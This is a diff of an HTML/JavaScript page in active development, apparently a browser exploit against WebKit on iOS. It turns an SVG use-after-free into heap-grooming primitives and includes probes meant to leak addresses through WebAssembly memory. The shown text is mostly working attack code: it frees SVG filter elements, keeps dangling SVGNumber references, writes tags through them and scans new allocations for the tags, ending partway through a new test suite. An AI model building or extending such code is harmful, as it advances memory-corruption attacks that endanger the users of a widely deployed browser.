@@ -2,22 +2,22 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>SVG UAF v41</title>
+<title>SVG UAF v42</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#0d0d0d;color:#00ff41;font-family:'Courier New',monospace;padding:16px;min-height:100vh}
 h2{color:#ff4141;font-size:11px;letter-spacing:2px;text-transform:uppercase}
-.sub{color:#444;font-size:10px;margin-bottom:8px;line-height:1.6}
+.sub{color:#444;font-size:10px;margin-bottom:8px;line-height:1.8}
 #controls{display:flex;gap:5px;flex-wrap:wrap;margin-bottom:8px}
 button{background:#111;border:1px solid #333;color:#00ff41;padding:5px 12px;cursor:pointer;font-family:monospace;font-size:10px}
 button:hover:not(:disabled){border-color:#00ff41}
 button:disabled{opacity:.3}
 #log{font-size:10px;line-height:1.7;white-space:pre-wrap;word-break:break-all;margin-top:6px}
 .ok{color:#00ff41}.bad{color:#ff4141}.inf{color:#ffcc00}.dim{color:#444}.sep{color:#1a1a1a}.win{color:#ff00ff}.crit{color:#ff6600}
-#summary-panel{margin-top:24px;border:1px solid #333;border-radius:4px;overflow:hidden;display:none}
-#summary-panel.visible{display:block}
-#sh{background:#111;padding:8px 12px;font-size:11px;letter-spacing:2px;color:#ff4141;text-transform:uppercase;border-bottom:1px solid #333}
-#sb{padding:12px}
+#sp{margin-top:24px;border:1px solid #333;border-radius:4px;overflow:hidden;display:none}
+#sp.on{display:block}
+.sh{background:#111;padding:8px 12px;font-size:11px;letter-spacing:2px;color:#ff4141;text-transform:uppercase;border-bottom:1px solid #333}
+.sb{padding:12px}
 .sr{display:flex;align-items:flex-start;gap:10px;padding:6px 0;border-bottom:1px solid #1a1a1a}
 .sr:last-child{border-bottom:none}
 .sd{width:10px;height:10px;border-radius:50%;flex-shrink:0;margin-top:3px}
@@ -38,97 +38,73 @@ button:disabled{opacity:.3}
 </style>
 </head>
 <body>
-<h2>SVG UAF v41 — Bump exhaustion + WASM overlap + JSC heap bridge</h2>
+<h2>SVG UAF v42 — Correct post-alloc UAF write + IsoHeap freelist exhaustion</h2>
 <div class="sub">
-ROOT CAUSE (v40 confirmed): bmalloc scavenger is DISABLED in WKWebView iOS
-(WKWebView::WebContent calls bmalloc::Scavenger::setThreadEnabled(false)).
-Freed IsoHeap pages stay in freelist but NEW allocs skip freelist and use bump allocator
-on the CURRENT page. slot[0]=1 ALWAYS = we're always getting bump-allocated on a fresh page.
+v41 BUG FOUND: ALL prior tests wrote TAG *before* allocating new objects → constructor overwrites.
+v41 GC1 FALSE POSITIVE: gcZero triggered on identity matrix 0.0 slots (slots 1,2,3,4,6,7... are 0.0 in identity).
 
-FIX: exhaust the bump allocator's current page so the NEXT alloc MUST hit the freelist.
-IsoHeap bump page is 16KB. sizeof(SVGNumber) ≈ 16 bytes → 1024 per page.
-After freeing N objects, we need to alloc EXACTLY (page_capacity - remaining_bump_slots) new objects
-so the bump allocator page runs out, then alloc ONE MORE → hits freelist → sees our tag.
+CORRECT SEQUENCE (v42):
+  Step 1: alloc A (get dangling ref_A)
+  Step 2: free A → A's slot goes to IsoHeap freelist
+  Step 3: alloc B matrices → some SVGNumber in B lands at A's old address (from freelist OR bump)
+  Step 4: THEN write TAG via ref_A → overwrites whatever is now at A's old address
+  Step 5: SCAN ALL B slots for TAG → hit = groom confirmed!
 
-STRATEGY v41:
-1. BMP1: bump-page exhaust — binary search for exact bump exhaustion count
-   alloc A+B matrices: A = "filler to exhaust current bump page", B = "tagged test"
-   free B, alloc A+1 new matrices → if A+1 pushes past bump boundary → B's freed slot reused
-2. BMP2: feConvolveMatrix bump exhaustion (256 SVGNums per alloc = faster page fill)
-3. JSB1: JS-heap bridge via WebAssembly.Memory
-   wasm.Memory grows in 64KB pages. Its backing ArrayBuffer sits in FastMalloc.
-   THEORY: wasm.Memory backing store could overlap with SVGNumber IsoHeap region
-   in address space. If they're close, float32 ULP=512 oracle can detect them.
-4. JSB2: Float64Array as heap probe — typed arrays use the C heap (not JSC MarkedSpace)
-   Float64Array(N) allocates N*8 bytes in JavaScriptCore's butterfly heap
-   but the backing store itself may use FastMalloc
-   Test: alloc Float64Array, write patterns, free it (null ref), alloc SVGNumber,
-   check if Float64Array addresses overlap with SVGNumber addresses
-5. JSB3: ArrayBuffer detach probe — detach an ArrayBuffer and check if that memory
-   gets reused by SVGNumber allocation (FastMalloc → IsoHeap boundary test)
-6. WAS1: WebAssembly.Memory → SVGNumber address overlap oracle
-   Grow wasm.Memory by 1 page (64KB). Read its backing buffer as Float32Array.
-   Write our TAG to freed SVGNumber slot. Scan the entire wasm.Memory buffer for TAG.
-   If found: the wasm backing store and IsoHeap are in the SAME address space region!
-   This gives us a MEMORY SCANNER primitive.
-7. WAS2: Reverse — SVGNumber float32 write, scan wasm.Memory Float32Array
-   Write 9999999.0 to UAF slot, scan 64KB wasm buffer for that value.
-   On hit: we know the OFFSET within wasm.Memory of the SVGNumber → address leak!
-8. BRG1: JSC ArrayBuffer → IsoHeap proximity test
-   Alloc ArrayBuffer(65536), get its byteLength. Then alloc SVGNumber, free ArrayBuffer.
-   Use UAF write to write TAG to SVGNumber, then try to read TAG via a NEW ArrayBuffer
-   of same size (hoping it reuses the freed ArrayBuffer backing store).
-9. SZP1: sizeof(SVGNumber) probe via EXACT page fill
-   bmalloc page = 16384 bytes. If sizeof=8: 2048/page. If sizeof=16: 1024/page. If sizeof=24: 682/page.
-   Fill exactly 1024, 2048, 682 SVGNumbers, then alloc 1 more → if page boundary crossed → new alloc hits freelist
-   Detect page boundary crossing by watching alloc timing (new page = new mmap call = slower)
-10. GC1: force JSC GC → measure IsoHeap free behavior
-    JSC GC runs when JS heap pressure hits threshold. On GC: JSC scans all live objects.
-    Hypothesis: JSC GC also triggers bmalloc scavenger (they share the same process).
-    Test: fill JS heap to trigger GC, then check IsoHeap freelist.
+NOTE: the IsoHeap freelist is only used after the current bump page is EXHAUSTED.
+sizeof(SVGNumber) ≈ 16 bytes → 16384/16 = 1024 per page.
+We must alloc >1024 new SVGNumbers to push past the bump page before using the freelist.
+
+SUITES:
+PAW1: Post-Alloc Write × 1 (simple single A→B with 2048+ B matrices, write after all alloc)
+PAW2: Mass parallel — free 256 A matrices, alloc 4096 B, write ALL dangling refs, scan all B
+PAW3: Sweep — try every sizeof guess (8,12,16,24,32) to compute exact exhaustion count
+PAW4: Timed race — free A, alloc B in small batches, write after EACH batch, scan immediately
+PAW5: Reverse — alloc B first (push bump to boundary), THEN free A, THEN alloc 1 more (hits freelist)
+SZF1: sizeof detection via IsoHeap slot spacing (write distinct values to adjacent refs, measure gap)
+SZF2: Refcount probe — ref_A.value reads m_value(+12). ref_A.__proto__ tricks to read at different offsets
+OFF1: Offset probe — write to ALL 20 slots of A via setAttribute, free A, alloc B, scan all B slots
+OFF2: Cross-slot contamination — does writing to slot[0] corrupt adjacent slots in B?
+GCF1: GC + post-alloc write combo (trigger GC to move scavenger, then write after alloc)
 </div>
 <div id="controls">
-  <button onclick="runBMP1()">BMP1 bump</button>
-  <button onclick="runBMP2()">BMP2 kmat</button>
-  <button onclick="runJSB1()">JSB1 wasm</button>
-  <button onclick="runWAS1()">WAS1 scan</button>
-  <button onclick="runWAS2()">WAS2 rev</button>
-  <button onclick="runBRG1()">BRG1 buf</button>
-  <button onclick="runSZP1()">SZP1 sizeof</button>
-  <button onclick="runGC1()">GC1 jsgc</button>
+  <button onclick="runPAW1()">PAW1</button>
+  <button onclick="runPAW2()">PAW2</button>
+  <button onclick="runPAW3()">PAW3</button>
+  <button onclick="runPAW4()">PAW4</button>
+  <button onclick="runPAW5()">PAW5</button>
+  <button onclick="runSZF1()">SZF1</button>
+  <button onclick="runOFF1()">OFF1</button>
+  <button onclick="runOFF2()">OFF2</button>
+  <button onclick="runGCF1()">GCF1</button>
   <button onclick="runAll()">RUN ALL</button>
   <button onclick="copyLog()">COPY</button>
   <button onclick="clearAll()">CLR</button>
 </div>
 <div id="log"></div>
-<div id="summary-panel"><div id="sh">⚡ v41 — EXPLOIT CHAIN STATUS</div><div id="sb"></div></div>
+<div id="sp"><div class="sh">⚡ v42 — EXPLOIT CHAIN STATUS</div><div class="sb" id="sb"></div></div>
 <script>
 var SVG_NS='http://www.w3.org/2000/svg';
 var EL=document.getElementById('log');
-var SPanel=document.getElementById('summary-panel');
-var SBody=document.getElementById('sb');
-
+var SP=document.getElementById('sp');
+var SB=document.getElementById('sb');
 var R={
-  bmp1_hit:false, bmp1_threshold:null, bmp1_sizeof:null,
-  bmp2_hit:false,
-  jsb1_wasm_overlap:false,
-  was1_scan_hit:false, was1_offset:null,
-  was2_rev_hit:false, was2_offset:null,
-  brg1_buf_hit:false,
-  szp1_sizeof:null,
-  gc1_gc_trigger:false, gc1_freelist_after_gc:false,
-  // confirmed prior
-  uaf_confirmed:true,oracle_confirmed:true,srgb_confirmed:true,
-  uaf_stable:true,no_clamp:true,ptr2_ulp512:true,
-  scavenger_disabled:true, // v40 confirmed: WKWebView disables bmalloc scavenger
+  paw1_hit:false,paw1_slot:null,paw1_mat:null,
+  paw2_hit:false,paw2_hits:0,paw2_rate:0,
+  paw3_hit:false,paw3_sizeof:null,paw3_exhaustion:null,
+  paw4_hit:false,paw4_batch:null,
+  paw5_hit:false,
+  szf1_sizeof:null,
+  off1_hit:false,off1_slot:null,
+  off2_contamination:false,
+  gcf1_hit:false,
 };
 
 function log(m,c){var s=document.createElement('span');if(c)s.className=c;s.textContent=m+'\n';EL.appendChild(s);EL.scrollTop=EL.scrollHeight;}
 function sep(){log('----------------------------------------------------','sep');}
 function raf(){return new Promise(function(r){requestAnimationFrame(r);});}
 function sleep(ms){return new Promise(function(r){setTimeout(r,ms);});}
-function copyLog(){var t=EL.innerText+'\n'+(SBody.innerText||'');try{navigator.clipboard.writeText(t);}catch(e){var a=document.createElement('textarea');a.value=t;document.body.appendChild(a);a.select();document.execCommand('copy');a.remove();}}
-function clearAll(){EL.innerHTML='';SPanel.classList.remove('visible');SBody.innerHTML='';}
+function copyLog(){var t=EL.innerText+'\n'+(SB.innerText||'');try{navigator.clipboard.writeText(t);}catch(e){var a=document.createElement('textarea');a.value=t;document.body.appendChild(a);a.select();document.execCommand('copy');a.remove();}}
+function clearAll(){EL.innerHTML='';SP.classList.remove('on');SB.innerHTML='';}
 function dis(d){var b=document.querySelectorAll('button');for(var i=0;i<b.length;i++){var f=b[i].getAttribute('onclick')||'';if(f.indexOf('copy')===-1&&f.indexOf('clear')===-1)b[i].disabled=d;}}
 window.onerror=function(m,u,l){log('[CRASH] '+m+' L'+l,'bad');return false;};
 function identity20(){return[1,0,0,0,0,0,1,0,0,0,0,0,1,0,0,0,0,0,1,0];}
@@ -149,702 +125,735 @@ function makeFCM(vals,fid){
 }
 function cleanupD(d){if(d&&d.svg&&d.svg.parentNode)d.svg.parentNode.removeChild(d.svg);}
 
-function readAllSlots(fcm){
-  var out=[];
-  for(var i=0;i<20;i++){var v=null;try{v=fcm.values.baseVal[i].value;}catch(e){}out.push(v);}
-  return out;
+function readSlot(fcm,idx){try{return fcm.values.baseVal[idx].value;}catch(e){return null;}}
+function readAll(fcm){var o=[];for(var i=0;i<20;i++)o.push(readSlot(fcm,i));return o;}
+
+// Check if ANY slot in a matrix has our TAG (excludes values that appear in identity matrix)
+// identity = [1,0,0,0,0,0,1,0,0,0,0,0,1,0,0,0,0,0,1,0]
+// identity values: 0.0 and 1.0 only.
+// Our TAGs must NOT be 0 or 1 to be distinguishable from fresh/identity allocs.
+var TAG_A = 7654321.0;   // primary tag — NOT 0 or 1
+var TAG_B = 1234567.0;   // secondary
+var TAG_C = 9876543.0;   // tertiary
+
+function isTag(v){
+  if(v===null||v===undefined)return false;
+  return Math.abs(v-TAG_A)<0.5||Math.abs(v-TAG_B)<0.5||Math.abs(v-TAG_C)<0.5;
 }
 
-/*
- * BMP1: Bump-page exhaustion — find exact IsoHeap page boundary
- *
- * THE KEY INSIGHT:
- * bmalloc IsoHeap has TWO paths for allocation:
- *   A) Bump allocator: fast path, allocates from current page sequentially
- *   B) Freelist: used ONLY when bump allocator page is FULL (all slots used)
- *
- * When bump page is full → IsoHeap switches to freelist OR allocates new page.
- * If freelist is non-empty → uses freelist! This is the groom window.
- *
- * ALGORITHM:
- * 1. Alloc BASELINE = N matrices (fills current bump page partially/fully)
- * 2. Free BASELINE (goes to freelist)
- * 3. Alloc FILLER = M matrices (refills the bump page from scratch)
- * 4. If M >= page_capacity: next alloc MUST use freelist (our freed BASELINE slots)
- * 5. Alloc ONE more matrix (PROBE)
- * 6. If PROBE's slot[0] != 1.0 → we hit the freelist → BASELINE tag survived!
- *
- * The trick: we need FILLER to exactly exhaust the current bump page.
- * We binary search M from 0 to 2048 (max page capacity if sizeof=8).
- *
- * PHASE 1: alloc 1024+N matrices to get past any existing state
- * PHASE 2: binary search for the bump boundary
- *
- * TAG = 7654321.0 (impossible identity value)
- */
-async function runBMP1(q){
-  if(!q){dis(true);sep();log('BMP1: IsoHeap bump-page exhaustion — binary search for freelist hit','inf');sep();}
-
-  var TAG=7654321.0;
-  var IMPOSSIBLE=9999999.0;
-
-  // First: establish a fresh baseline — alloc a large number of matrices to
-  // get the bump allocator to a known state (top of a page)
-  log('  Phase 0: establishing baseline state (alloc+free 4096 to stabilize bump ptr)','inf');
-  {
-    var baseline=[];
-    for(var i=0;i<4096;i++)baseline.push(makeFCM(identity20()));
-    await raf();await raf();
-    for(var i=4095;i>=0;i--)cleanupD(baseline[i]);
-    baseline=null;
-    await raf();await raf();await sleep(50);
-  }
-
-  // Now: alloc our TAGGED matrices (these go to freelist when freed)
-  var NTAG=512; // 512 feColorMatrix = 10240 SVGNumbers in freelist
-  log('  Phase 1: alloc '+NTAG+' TAGGED matrices (will go to freelist)','inf');
-  var taggedDs=[];
-  for(var i=0;i<NTAG;i++){
-    var tv=new Array(20).fill(IMPOSSIBLE);
-    taggedDs.push(makeFCM(tv));
-  }
-  await raf();await raf();
-  // FREE them — they go to freelist
-  for(var i=NTAG-1;i>=0;i--)cleanupD(taggedDs[i]);
-  taggedDs=null;
-  await raf();await raf();
-
-  // Phase 2: binary search — find how many FILLER matrices exhaust the bump page
-  // We need to alloc FILLER matrices (identity) to drain the bump allocator,
-  // then alloc ONE PROBE matrix and check if it hits our freed freelist
-  log('  Phase 2: binary search for bump-page exhaustion (testing filler counts)','inf');
-
-  var lo=0,hi=2048,found=false;
-  var testCounts=[64,128,256,384,512,640,768,896,1024,1152,1280,1408,1536,1664,1792,1920,2048];
-
-  for(var ti=0;ti<testCounts.length&&!found;ti++){
-    var FILL=testCounts[ti];
-    var fillerDs=[];
-    for(var i=0;i<FILL;i++)fillerDs.push(makeFCM(identity20()));
-    await raf();await raf();
-
-    // Alloc ONE probe matrix
-    var probe=makeFCM(identity20());
-    await raf();
-    var slots=readAllSlots(probe.fcm);
-    var anyHit=slots.some(function(v){return typeof v==='number'&&Math.abs(v-IMPOSSIBLE)<1;});
-    var slot0=slots[0];
-
-    // Clean up filler + probe
-    cleanupD(probe);
-    for(var i=FILL-1;i>=0;i--)cleanupD(fillerDs[i]);
-    fillerDs=null;
-    await raf();await sleep(20);
-
-    log('  FILL='+FILL+': probe slot[0]='+slot0+(anyHit?' ← FREELIST HIT! IMPOSSIBLE found!':' (fresh='+slot0+')'),(anyHit?'win':'dim'));
-
-    if(anyHit){
-      R.bmp1_hit=true;
-      R.bmp1_threshold=FILL;
-      R.bmp1_sizeof=Math.round(16384/FILL*20); // estimated sizeof
-      log('  ✅ FREELIST HIT at FILL='+FILL+'! sizeof(SVGNumber)≈'+R.bmp1_sizeof+' bytes','win');
-      found=true;
+function scanForTag(matrices,tag){
+  tag=tag||TAG_A;
+  for(var i=0;i<matrices.length;i++){
+    var fcm=matrices[i].fcm;
+    if(!fcm)continue;
+    for(var j=0;j<20;j++){
+      var v=readSlot(fcm,j);
+      if(v!==null&&Math.abs(v-tag)<0.5)return{mat:i,slot:j,val:v};
     }
   }
-
-  if(!found){
-    log('  no freelist hit up to FILL=2048 (32768 bump slots)','bad');
-    log('  CONCLUSION: bump allocator never exhausted OR sizeof(SVGNumber) > 32 bytes','inf');
-    log('  ALTERNATIVE: IsoHeap freelist path may require TWO phases (alloc after free-all on same page)','inf');
-    // Try the "same page" approach: alloc exactly page_capacity, free exactly page_capacity, alloc 1
-    log('  Phase 3: exact page drain — alloc N, free N, alloc 1 (no filler)','inf');
-    for(var pci=0;pci<[1024,2048,4096,8192].length;pci++){
-      var PC=[1024,2048,4096,8192][pci];
-      var pds=[];
-      for(var i=0;i<PC;i++){var pv=new Array(20).fill(IMPOSSIBLE);pds.push(makeFCM(pv));}
-      await raf();await raf();
-      for(var i=PC-1;i>=0;i--)cleanupD(pds[i]);
-      pds=null;
-      await raf();await raf();await sleep(10);
-      var pProbe=makeFCM(identity20());await raf();
-      var pSlots=readAllSlots(pProbe.fcm);
-      var pHit=pSlots.some(function(v){return typeof v==='number'&&Math.abs(v-IMPOSSIBLE)<1;});
-      cleanupD(pProbe);
-      log('  exact drain PC='+PC+': probe slot[0]='+pSlots[0]+(pHit?' ← HIT!':' (fresh)'),pHit?'win':'dim');
-      if(pHit){R.bmp1_hit=true;R.bmp1_threshold=PC;break;}
-      await sleep(20);
-    }
-  }
-
-  if(!q)dis(false);
+  return null;
 }
 
 /*
- * BMP2: feConvolveMatrix bump exhaustion (256 SVGNumbers per element)
+ * PAW1: Post-Alloc Write — CORRECT SEQUENCE
  *
- * Using 256-slot kernelMatrix elements means each alloc puts 256 SVGNumbers
- * on the bump allocator. Page capacity ≈ 1024/page → 4 kernelMatrix per page.
- * This gives us much coarser control.
+ * THE FIX vs all previous versions:
+ * Previous: write TAG → free → alloc new → read (WRONG: constructor destroys tag)
+ * Correct:  free → alloc new → write TAG via dangling ref → read new alloc
  *
- * Strategy: alloc TAGGED kernelMatrix (256×IMPOSSIBLE), free,
- * then alloc exactly 4 new kernelMatrix (exhausts one page),
- * then alloc ONE regular matrix → should hit freelist.
+ * KEY: We write AFTER the new allocation. The constructor already ran (writes identity).
+ * Our post-alloc UAF write overwrites the new SVGNumber's m_value field (offset 12).
+ * Since we're writing AFTER construction, nothing overwrites our tag.
+ *
+ * EXHAUSTION LOGIC:
+ * IsoHeap has 2 allocation paths:
+ *   Path A (fast): bump allocator — allocates from current page sequentially
+ *   Path B (slow): freelist — only used when bump page is exhausted
+ *
+ * A's freed slot goes to freelist (Path B). New allocs use Path A first.
+ * We need to exhaust Path A (use all remaining bump slots on current page)
+ * so that when we alloc ONE MORE, it hits Path B (freelist) and gets A's slot.
+ *
+ * sizeof(SVGNumber) = 16 bytes (vtable:8 + refcount:4 + value:4)
+ * Page size = 16384 bytes → 1024 SVGNumbers per page
+ * We must alloc 1024+ new SVGNumbers to push past the current bump page.
+ *
+ * DETECTION: Tag is NOT 0 or 1. Identity matrix uses only 0.0 and 1.0.
+ * Any slot showing TAG_A = 7654321.0 in a new matrix = GROOM CONFIRMED.
+ *
+ * We try multiple batch sizes: 256, 512, 1024, 2048, 4096, 8192 new SVGNumbers
+ * (12, 25, 51, 102, 204, 409 new matrices × 20 slots each)
+ * Scan ALL slots of ALL new matrices after EACH write.
  */
-async function runBMP2(q){
-  if(!q){dis(true);sep();log('BMP2: kernelMatrix bump exhaustion','inf');sep();}
+async function runPAW1(q){
+  if(!q){dis(true);sep();log('PAW1: Post-Alloc Write — correct UAF sequence','inf');sep();}
 
-  var IMPOSSIBLE2=8888888.0;
-
-  function makeKM(nvals,tagval,fid){
-    fid=fid||('km'+Math.random().toString(36).slice(2,8));
-    var svg=document.createElementNS(SVG_NS,'svg');svg.setAttribute('width','1');svg.setAttribute('height','1');
-    svg.style.cssText='position:fixed;top:-9999px;left:-9999px;opacity:0;pointer-events:none';
-    var defs=document.createElementNS(SVG_NS,'defs');
-    var filt=document.createElementNS(SVG_NS,'filter');filt.setAttribute('id',fid);
-    var fck=document.createElementNS(SVG_NS,'feConvolveMatrix');
-    var ord=Math.round(Math.sqrt(nvals));
-    fck.setAttribute('order',String(ord));
-    var kv=new Array(nvals).fill(tagval);
-    fck.setAttribute('kernelMatrix',kv.join(' '));
-    fck.setAttribute('divisor','1');
-    filt.appendChild(fck);defs.appendChild(filt);svg.appendChild(defs);document.body.appendChild(svg);
-    return{svg:svg,fck:fck};
-  }
-
-  // approach: tag 256 SVGNumbers, free, exhaust bump with N×256 more, probe
-  var fillerCounts=[4,8,16,32,64,128];
-  var hit2=false;
-
-  for(var fi=0;fi<fillerCounts.length&&!hit2;fi++){
-    var NFILL=fillerCounts[fi];
-
-    // alloc + free TAGGED block
-    var tagged=makeKM(256,IMPOSSIBLE2);
-    await raf();await raf();
-    if(tagged.svg.parentNode)tagged.svg.parentNode.removeChild(tagged.svg);
-    tagged=null;
-    await raf();await sleep(10);
-
-    // alloc FILLER (exhaust bump)
-    var fillers=[];
-    for(var i=0;i<NFILL;i++)fillers.push(makeKM(256,0.5));
-    await raf();await raf();
-
-    // alloc PROBE (should hit freelist)
-    var probe2=makeFCM(identity20());await raf();
-    var slots2=readAllSlots(probe2.fcm);
-    var hit2b=slots2.some(function(v){return typeof v==='number'&&Math.abs(v-IMPOSSIBLE2)<1;});
-    cleanupD(probe2);
-    for(var i=NFILL-1;i>=0;i--){if(fillers[i].svg.parentNode)fillers[i].svg.parentNode.removeChild(fillers[i].svg);}
-    fillers=null;
-
-    log('  NFILL='+NFILL+'×256='+(NFILL*256)+' bump slots: probe slot[0]='+slots2[0]+(hit2b?' ← HIT!':' (fresh)'),hit2b?'win':'dim');
-    if(hit2b){R.bmp2_hit=true;hit2=true;}
-    await sleep(20);
-  }
-
-  if(!hit2)log('  no freelist hit','bad');
-  if(!q)dis(false);
-}
-
-/*
- * JSB1: WebAssembly.Memory backing store vs IsoHeap proximity
- *
- * WebAssembly.Memory allocates a contiguous region via mmap (on iOS: MAP_ANON).
- * bmalloc IsoHeap also uses mmap for its pages.
- * Both live in the same virtual address space of the WebContent process.
- *
- * KEY IDEA:
- * If we can get a wasm.Memory page to be mapped ADJACENT to an IsoHeap page,
- * then:
- * - wasm.Memory[offset] corresponds to the same physical address as an IsoHeap slot
- * - We can READ the freed SVGNumber float value through wasm.Memory
- * - We can WRITE to IsoHeap through wasm.Memory (bypass UAF entirely!)
- *
- * TEST APPROACH:
- * 1. Create wasm.Memory (starts at 1 page = 64KB)
- * 2. Write TAG to freed SVGNumber slot (UAF write)
- * 3. Scan entire wasm.Memory as Float32Array for TAG
- * 4. If found: address space overlap confirmed!
- *
- * WHY THIS MIGHT WORK:
- * - On iOS, mmap(MAP_ANON) gets pages from the VM system
- * - Both bmalloc and wasm use VM pages
- * - With enough wasm pages, probability of overlap increases
- * - We can grow wasm.Memory up to 128MB (2048 pages) to scan a large region
- *
- * This is a MEMORY SCANNER, not a groom. If it hits, we can:
- * - Find the EXACT offset of any SVGNumber in wasm.Memory
- * - Read/write any IsoHeap slot through wasm.Memory (no freelist needed!)
- * - This BYPASSES the entire groom problem!
- */
-async function runJSB1(q){
-  if(!q){dis(true);sep();log('JSB1: WebAssembly.Memory ↔ IsoHeap proximity scan','inf');sep();}
-
-  if(typeof WebAssembly==='undefined'||typeof WebAssembly.Memory==='undefined'){
-    log('  WebAssembly not available!','bad');if(!q)dis(false);return;
-  }
-
-  var SCAN_TAG=6543210.0; // our probe tag
-
-  // Create wasm memory — try multiple sizes
-  var wasmPageCounts=[4,16,64,256]; // 256KB, 1MB, 4MB, 16MB
+  var batchSVGCounts=[256,512,1024,2048,4096,8192];
   var found=false;
 
-  for(var wpi=0;wpi<wasmPageCounts.length&&!found;wpi++){
-    var WPAGES=wasmPageCounts[wpi];
-    var wmem=null;
-    try{wmem=new WebAssembly.Memory({initial:WPAGES,maximum:WPAGES+64});}
-    catch(e){log('  wasm.Memory('+WPAGES+' pages) failed: '+e,'bad');continue;}
-    var wbuf=wmem.buffer; // ArrayBuffer
-    var wf32=new Float32Array(wbuf);
-    var wBytes=wbuf.byteLength;
-    log('  wasm.Memory: '+WPAGES+' pages = '+wBytes+' bytes ('+Math.round(wBytes/1024)+'KB)','inf');
+  for(var bi=0;bi<batchSVGCounts.length&&!found;bi++){
+    var NSVG=batchSVGCounts[bi];
+    var NMAT=Math.ceil(NSVG/20);
 
-    // Create UAF primitive: alloc, get baseVal ref, free parent
-    var d1=makeFCM(identity20());
+    // --- STEP 1: Alloc A, get dangling ref ---
+    var dA=makeFCM(identity20());
     await raf();
-    var ref1=null;
-    try{ref1=d1.fcm.values.baseVal[0];}catch(e){}
-    if(!ref1){log('  failed to get UAF ref','bad');cleanupD(d1);wmem=null;continue;}
-    cleanupD(d1); // free parent — ref1 is now dangling
+    var refA=null;
+    try{refA=dA.fcm.values.baseVal[0];}catch(e){}
+    if(!refA){log('  PAW1: failed to get baseVal ref','bad');cleanupD(dA);continue;}
+
+    // --- STEP 2: Free A (ref_A is now dangling, points to freed SVGNumber memory) ---
+    cleanupD(dA);dA=null;
     await raf();await raf();
 
-    // UAF write: write SCAN_TAG to freed slot
-    try{ref1.value=SCAN_TAG;}catch(e){log('  UAF write failed: '+e,'bad');}
-    await raf();
+    // --- STEP 3: Alloc NMAT new B matrices ---
+    // IsoHeap's freelist has A's slot. As we alloc, bump allocator uses current page first.
+    // After ~1024 allocs (1 full page), bump must use freelist → hits A's slot.
+    var Bs=[];
+    for(var i=0;i<NMAT;i++)Bs.push(makeFCM(identity20()));
+    await raf();await raf();
 
-    // Scan wasm.Memory for SCAN_TAG
-    var scanHits=[];
-    for(var i=0;i<wf32.length;i++){
-      if(Math.abs(wf32[i]-SCAN_TAG)<0.5)scanHits.push(i);
-    }
+    // --- STEP 4: Write TAG via dangling ref_A ---
+    // A's freed slot now has a live SVGNumber from one of the B matrices.
+    // The constructor ran when B was allocated → identity values set.
+    // NOW we write TAG via ref_A → this overwrites m_value of whatever SVGNumber is at A's address.
+    // If IsoHeap reused A's slot: the target SVGNumber IS one of B's SVGNumbers.
+    try{refA.value=TAG_A;}catch(e){log('  PAW1 NSVG='+NSVG+': UAF write threw: '+e,'bad');}
 
-    log('  scan '+wf32.length+' float32s for TAG='+SCAN_TAG+': '+scanHits.length+' hits'+(scanHits.length?(' at offsets: '+scanHits.slice(0,5).join(',')):''),scanHits.length?'win':'dim');
+    // --- STEP 5: Scan ALL B matrices for TAG ---
+    var hit=scanForTag(Bs,TAG_A);
+    log('  NSVG='+NSVG+' ('+NMAT+' mats, '+NSVG+' SVGNums): '+(hit?'✅ TAG FOUND! mat['+hit.mat+'] slot['+hit.slot+']='+hit.val:'no hit')+'',hit?'win':'dim');
 
-    if(scanHits.length>0){
-      R.jsb1_wasm_overlap=true;
-      R.was1_scan_hit=true;
-      R.was1_offset=scanHits[0];
+    // cleanup
+    for(var i=0;i<Bs.length;i++)cleanupD(Bs[i]);
+    Bs=null;refA=null;
+    await raf();await sleep(30);
+
+    if(hit){
+      R.paw1_hit=true;R.paw1_slot=hit.slot;R.paw1_mat=hit.mat;
+      log('  PAW1 CONFIRMED: groom at NSVG='+NSVG+', slot['+hit.slot+']='+hit.val,'win');
       found=true;
-      log('  ✅ WASM MEMORY OVERLAP! SVGNumber slot found at wasm offset '+scanHits[0]+' (byte '+scanHits[0]*4+')','win');
-      // Try to read the value back through wasm
-      var readback=wf32[scanHits[0]];
-      log('  readback via wasm['+scanHits[0]+']='+readback,'win');
-      // Try to WRITE through wasm (overwrite IsoHeap)
-      wf32[scanHits[0]]=1234567.0;
-      await raf();
-      // Check if a new SVGNumber at that address sees our write
-      var dNew=makeFCM(identity20());await raf();
-      var newSlots=readAllSlots(dNew.fcm);
-      var wasmWrite=newSlots.some(function(v){return typeof v==='number'&&Math.abs(v-1234567)<1;});
-      log('  wasm write test: '+(wasmWrite?'✅ WROTE TO ISOHEAP VIA WASM!!!':'no wasm write effect'),wasmWrite?'win':'inf');
-      cleanupD(dNew);
     }
-
-    wmem=null;wbuf=null;wf32=null;
-    await sleep(50);
   }
 
-  if(!found)log('  no wasm/IsoHeap overlap in '+wasmPageCounts[wasmPageCounts.length-1]+' wasm pages','bad');
+  if(!found)log('  PAW1: no groom confirmed — freelist not triggered up to 8192 new SVGNums','bad');
   if(!q)dis(false);
 }
 
 /*
- * WAS1: wasm.Memory as memory scanner (reverse direction)
+ * PAW2: Mass parallel post-alloc write
  *
- * Instead of looking for SVGNumber in wasm memory,
- * we look for wasm memory in SVGNumber's address range.
+ * Instead of ONE dangling ref, we create 512 dangling refs (free 512 A matrices).
+ * Then alloc 4096 B matrices.
+ * Then write TAG via ALL 512×20 = 10240 dangling refs simultaneously.
+ * Then scan all 4096×20 = 81920 B slots for TAG.
  *
- * APPROACH:
- * Write a known pattern to wasm.Memory bytes.
- * Then alloc many SVGNumbers and check if any slot matches the pattern.
+ * Statistical argument: with 10240 freed slots and 81920 new slots,
+ * if IsoHeap EVER reuses freed slots, at least one of the 10240 freed slots
+ * will collide with one of the 81920 new slots.
  *
- * If a fresh SVGNumber slot contains bytes that look like our wasm pattern:
- * → the SVGNumber was allocated at an address that OVERLAPS wasm memory
- * → we know the wasm memory address of that SVGNumber!
- *
- * Bonus: if we write increasing values to wasm.Memory (wasm[i]=i*4),
- * then a new SVGNumber containing float(i*4) tells us its address = wasm_base + i*4.
- * ADDRESS LEAK!
+ * Hit rate = number of grooms / 81920 scanned slots.
+ * If rate > 0: IsoHeap freelist IS being used!
+ * If rate = 0: IsoHeap NEVER reuses freed pages (pages returned to OS or held permanently)
  */
-async function runWAS1(q){
-  if(!q){dis(true);sep();log('WAS1: wasm pattern → SVGNumber address leak','inf');sep();}
+async function runPAW2(q){
